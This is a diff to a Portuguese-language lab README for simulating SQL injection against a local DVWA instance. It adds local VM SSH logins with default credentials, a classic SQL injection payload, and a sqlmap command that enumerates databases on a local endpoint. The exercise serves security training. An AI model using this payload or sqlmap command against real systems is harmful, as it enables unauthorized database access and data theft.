@@ -17,6 +17,15 @@ Simular um ataque de injeção de SQL em uma aplicação web vulnerável e ident
 - apache
 - openssh
 
+## Credencias das Máquinas Virtuais
+
+`ssh -p 2022 seg@127.0.0.1`
+
+`ssh -p 3022 seg@127.0.0.1`
+
+usuário: `seg`
+senha: `seg`
+
 ## Configuração do DVWA
 
 `http://localhost:2080/dvwa`
@@ -27,9 +36,17 @@ senha: `password`
 
 ## Execução do Ataque
 
+`1' OR '1'='1' --`
+
+`sqlmap -u "http://10.0.2.2:2080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=xxxx" --dbs`
+
 ## Detecção e Auditoria
 
+`/var/log/httpd`
+
 ## Mitigação da Falha
+
+`High`
 
 ## Evidências e Documentação
 
